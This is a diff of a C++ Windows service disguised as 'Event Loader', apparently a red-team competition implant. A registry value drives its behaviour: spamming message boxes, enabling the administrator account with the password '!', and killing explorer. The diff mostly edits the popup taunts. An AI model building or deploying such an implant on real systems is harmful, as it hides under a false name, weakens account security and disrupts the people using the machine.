@@ -15,12 +15,12 @@
 	Current Registry Value to Control Flow : Check the PopThread Documentation (DWORD)
 
 	0x0000000 : The default waiting value
-	0x0000001 : Message "Welcome to Prom!!!" as title and "Are you ready for a long day?" as message 100x.
-	0x0000002 : Messsage "IMPORTANT NOTICE!!!" as title and "Are you feeling it now Mr. Krabs?" as a message.
-	0x0000003 : Messsage "IMPORTANT NOTICE!!!" as title and "Are you feeling it now Mr. Krabs?" as a message.
+	0x0000001 : Message messageSpam(L"Welcome!!!", L"Are you ready for a long day? May the force be with you padawan.", NUM_BOXES);
+	0x0000002 : messageSpam(L"IMPORTANT NOTIFICATION", L"You feeling it now Mr. Krabs?", NUM_BOXES);
+	0x0000003 : messageSpam(L"IMPORTANT NOTIFICATION", L"Just wanted to let you know, we're still here.", NUM_BOXES);
 	0x0000004 : Sets the administrator users as active and sets the password to "!"
 	0x0000005 : Kills the process explorer.
-	0x0000006 : Messsage "IMPORTANT NOTICE!!!" as title and "Will you go to prom with me?" as a message.
+	0x0000006 : messageSpam(L"HEY BLUE TEAM", L"Blue I am your daddy ;)", NUM_BOXES);
 
 */
 
@@ -37,7 +37,7 @@ using namespace std;
 
 // Defines Located Here
 #define ServiceName L"Event Loader"
-#define NUM_BOXES 100
+#define NUM_BOXES 10
 
 // Globals Located Here
 SERVICE_STATUS ServiceStatus;
@@ -150,7 +150,7 @@ DWORD WINAPI PopupThread(LPVOID lpParameter) {
 			if (result == ERROR_SUCCESS) {
 				// TODO : Update this to a switch statment
 				if (buffer == 0x00000001) {
-					messageSpam(L"Welcome to Prom!!!", L"Are you ready for a long day?", NUM_BOXES);
+					messageSpam(L"Welcome!!!", L"Are you ready for a long day? May the force be with you padawan.", NUM_BOXES);
 				}
 				else if (buffer == 0x00000002) {
 					messageSpam(L"IMPORTANT NOTIFICATION", L"You feeling it now Mr. Krabs?", NUM_BOXES);
@@ -165,7 +165,7 @@ DWORD WINAPI PopupThread(LPVOID lpParameter) {
 					killExplorer();
 				}
 				else if (buffer == 0x0000006) {
-					messageSpam(L"HEY BLUE TEAM", L"Will go to Prom with me? :) -Red Team", NUM_BOXES);
+					messageSpam(L"HEY BLUE TEAM", L"Blue I am your daddy ;)", NUM_BOXES);
 				}
 			}
 			RegSetValueEx(hKey, regRead, 0, REG_DWORD, (BYTE*)&resetValue, sizeof(resetValue));
